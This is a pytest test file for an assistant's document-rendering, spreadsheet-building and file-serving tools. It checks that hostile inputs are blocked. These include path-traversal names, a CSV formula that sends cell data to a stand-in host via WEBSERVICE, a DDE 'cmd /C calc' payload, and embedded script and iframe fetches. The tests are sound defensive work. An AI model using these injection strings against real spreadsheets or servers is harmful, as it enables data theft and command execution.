"""
design.* tools: rendering documents, building spreadsheets, and handing the files back.

Naming, spreadsheet, receipt and route tests are hermetic. Render tests need Playwright's
Chromium and skip without it (CI installs no browser). Output goes to a per-test
cfg.DESIGNS_DIR.
"""

import struct
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

import pytest

import kai.config as cfg
from kai.core._app_state import set_current_user_id
from kai.core.engine import tool_receipt
from kai.tools.design import _common, render, spreadsheet


@pytest.fixture
def designs(tmp_path, monkeypatch):
    monkeypatch.setattr(cfg, "DESIGNS_DIR", tmp_path / "designs")
    set_current_user_id(7)
    yield tmp_path / "designs" / "7"
    set_current_user_id(0)


@pytest.fixture(scope="module")
def chromium():
    pytest.importorskip("playwright")
    from playwright.sync_api import sync_playwright

    try:
        with sync_playwright() as pw:
            pw.chromium.launch(headless=True).close()
    except Exception:
        pytest.skip("needs Playwright's Chromium")


# ── Naming ────────────────────────────────────────────────────────────────────


def test_stem_is_a_bare_slug():
    assert _common.stem("Bake Sale Flyer.pdf") == "bake-sale-flyer"
    assert _common.stem("../../etc/passwd") == "etc-passwd"
    assert _common.stem("   ") == "design"
    assert _common.stem("compost_presentation") == "compost_presentation"


def test_unknown_theme_falls_back():
    assert _common.theme_name("Coral") == "coral"
    assert _common.theme_name("neon") == _common.DEFAULT_THEME


def test_placeholders_are_found_but_links_are_not():
    text = "Call [INSERT PHONE NUMBER] or [Your Name]. Date TBD. See [the site](https://x.y)."
    found = render._PLACEHOLDER_RE.findall(text)
    assert found == ["[INSERT PHONE NUMBER]", "[Your Name]", "TBD"]


# ── Spreadsheets ──────────────────────────────────────────────────────────────


def _sheet(designs, csv):
    pytest.importorskip("openpyxl")
    from openpyxl import load_workbook

    result = spreadsheet.design_spreadsheet("bills", csv)
    return result, load_workbook(designs / "bills.xlsx").active


def test_money_split_at_a_thousands_comma_is_rejoined(designs):
    # gemma4:12b wrote exactly this in the 2026-09-21 live test: the unquoted comma split
    # $1,200.00 into two cells, and the Total silently summed $1 instead of $1,200.
    result, ws = _sheet(
        designs,
        "Bill Name,Amount\nRent,$1,200.00\nCar Payment,$350.00\nGym,$30.00\nTotal,=SUM(B2:B4)",
    )
    assert result["columns"] == 2
    assert ws["B2"].value == 1200.0
    assert ws["B2"].number_format == spreadsheet.FMT_MONEY
    assert ws["B5"].value == "=SUM(B2:B4)"
    assert ws["B5"].number_format == spreadsheet.FMT_MONEY
    assert "notes" not in result


def test_side_by_side_numbers_stay_apart(designs):
    _, ws = _sheet(designs, "Item,Qty,Price\nBolts,1,200")
    assert (ws["B2"].value, ws["C2"].value) == (1, 200)


def test_types_and_formats(designs):
    result, ws = _sheet(
        designs, "Item,Qty,Price,Tax,Total\nKit,10,$89.00,8%,=B2*C2\nTotal,,,,=SUM(E2:E2)"
    )
    assert ws["B2"].value == 10
    assert ws["D2"].value == pytest.approx(0.08)
    assert ws["D2"].number_format == spreadsheet.FMT_PERCENT
    assert ws["E2"].number_format == spreadsheet.FMT_MONEY  # =B2*C2 reads a dollar column
    assert ws["E3"].number_format == spreadsheet.FMT_MONEY
    assert ws["A3"].font.b and ws["A1"].font.b
    assert ws.freeze_panes == "A2"
    assert result["formulas"] == 2


def test_formulas_that_reach_outside_stay_text(designs):
    result, ws = _sheet(
        designs,
        "A,B\n1,=WEBSERVICE(\"http://x.test/?\"&A2)\n2,=cmd|' /C calc'!A0",
    )
    assert ws["B2"].data_type == "s" and not str(ws["B2"].value).startswith("=")
    assert ws["B3"].data_type == "s" and not str(ws["B3"].value).startswith("=")
    assert len(result["notes"]) == 2
    assert result["formulas"] == 0


def test_function_names_that_look_like_cells_do_not_grow_the_sheet(designs):
    result, ws = _sheet(designs, "Value,Log\n$100.00,=LOG10(A2)")
    assert ws.max_column == 2
    assert result["formulas"] == 1


def test_short_rows_are_reported(designs):
    result, _ = _sheet(designs, "A,B,C\n1,2")
    assert result["notes"] == ["Row 2 has 2 cells; the header has 3."]


def test_output_lands_in_the_account_folder(designs):
    result, _ = _sheet(designs, "A\n1")
    entry = result["files"][0]
    assert entry["path"] == str(designs / "bills.xlsx")
    assert entry["url"].startswith("/api/designs/bills.xlsx?v=")


# ── Receipts ──────────────────────────────────────────────────────────────────


def test_receipt_carries_only_design_urls():
    output = {
        "files": [
            {"name": "a.pdf", "url": "/api/designs/a.pdf?v=1"},
            {"name": "a.preview.png", "url": "/api/designs/a.preview.png?v=1", "preview": True},
            {"name": "evil", "url": "https://evil.test/x.png"},
        ]
    }
    receipt = tool_receipt("design.render", {}, {"success": True, "output": output}, 5)
    assert [f["name"] for f in receipt["files"]] == ["a.pdf", "a.preview.png"]
    assert receipt["files"][1]["preview"] is True


def test_receipt_without_files_is_unchanged():
    receipt = tool_receipt("time.now", {}, {"success": True, "output": "noon"}, 1)
    assert "files" not in receipt
    failed = tool_receipt("design.render", {}, {"success": False, "error": "x"}, 1)
    assert "files" not in failed


# ── Route ─────────────────────────────────────────────────────────────────────


def _client(user_id):
    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    from kai.api.routes import designs as route

    app = FastAPI()

    @app.middleware("http")
    async def as_user(request, call_next):
        request.state.user = {"name": "t", "user_id": user_id} if user_id else None
        return await call_next(request)

    app.include_router(route.router)
    return TestClient(app)


def test_route_serves_only_the_callers_finished_files(tmp_path, monkeypatch):
    monkeypatch.setattr(cfg, "DESIGNS_DIR", tmp_path)
    (tmp_path / "7").mkdir()
    (tmp_path / "8").mkdir()
    (tmp_path / "7" / "flyer.pdf").write_bytes(b"%PDF-1.7 mine")
    (tmp_path / "7" / "flyer.md").write_text("# source")
    (tmp_path / "8" / "theirs.pdf").write_bytes(b"%PDF-1.7 theirs")

    me = _client(7)
    ok = me.get("/api/designs/flyer.pdf")
    assert ok.status_code == 200
    assert ok.headers["content-type"] == "application/pdf"
    assert ok.content == b"%PDF-1.7 mine"
    assert me.get("/api/designs/theirs.pdf").status_code == 404
    assert me.get("/api/designs/..%2F8%2Ftheirs.pdf").status_code == 404
    assert me.get("/api/designs/flyer.md").status_code == 404
    assert _client(None).get("/api/designs/flyer.pdf").status_code == 401


# ── Rendering ─────────────────────────────────────────────────────────────────


def _png_size(path):
    width, height = struct.unpack(">II", path.read_bytes()[16:24])
    return width, height


def test_slides_pdf_comes_with_a_preview(designs, chromium):
    deck = "# Deck\nsub\n\n---\n\n## One\n- a\n\n---\n\n## Two\n| x | y |\n|---|---|\n| 1 | 2 |"
    result = render.design_render("deck", deck, layout="slides")
    assert result["slides"] == 3
    names = [f["name"] for f in result["files"]]
    assert names == ["deck.pdf", "deck.preview.png"]
    assert (designs / "deck.pdf").read_bytes().startswith(b"%PDF")
    assert _png_size(designs / "deck.preview.png") == (2560, 1440)
    assert (designs / "deck.md").read_text() == deck


def test_slides_split_on_headings_when_separators_are_missing(designs, chromium):
    result = render.design_render("d", "# T\nsub\n\n## A\n- x\n\n## B\n- y", layout="slides")
    assert result["slides"] == 3


def test_flyer_png_is_one_letter_page(designs, chromium):
    md = "# Bake Sale\n### Saturday at the library\n\n## Details\n- 10am\n\n> Come hungry"
    result = render.design_render("flyer", md, layout="poster", format="png", theme="coral")
    assert [f["name"] for f in result["files"]] == ["flyer.png"]
    assert _png_size(designs / "flyer.png") == (1632, 2112)
    assert result["theme"] == "coral"


def test_overfull_slides_shrink_to_fit(designs, chromium):
    bullets = "\n".join(f"- Point {i} with a long explanation that wraps a line" for i in range(14))
    result = render.design_render("full", f"# T\nsub\n\n---\n\n## Lots\n{bullets}", "slides")
    assert result["shrunk_to_fit"] is True


def test_placeholders_come_back_with_a_note(designs, chromium):
    result = render.design_render("cat", "# Lost Cat\n\n> Call [INSERT PHONE NUMBER]", "flyer")
    assert result["placeholders"] == ["[INSERT PHONE NUMBER]"]
    assert "Ask the user" in result["note"]


def test_bad_layout_is_refused(designs, chromium):
    with pytest.raises(ValueError, match="Unknown layout"):
        render.design_render("x", "# hi", layout="brochure-3d")


def test_render_makes_no_network_requests(designs, chromium):
    hits = []

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append(self.path)
            self.send_response(200)
            self.end_headers()

        def log_message(self, *args):
            pass

    server = HTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{server.server_port}"
    try:
        render.design_render("md", f"# Hi\n\n![x]({base}/md.png)", "document", "png")
        html = (
            f'<link rel="stylesheet" href="{base}/a.css"><img src="{base}/b.png">'
            f'<iframe src="{base}/c"></iframe><script>fetch("{base}/d")</script>'
        )
        render.design_render("page", html, "html", "pdf")
    finally:
        server.shutdown()
    assert hits == []
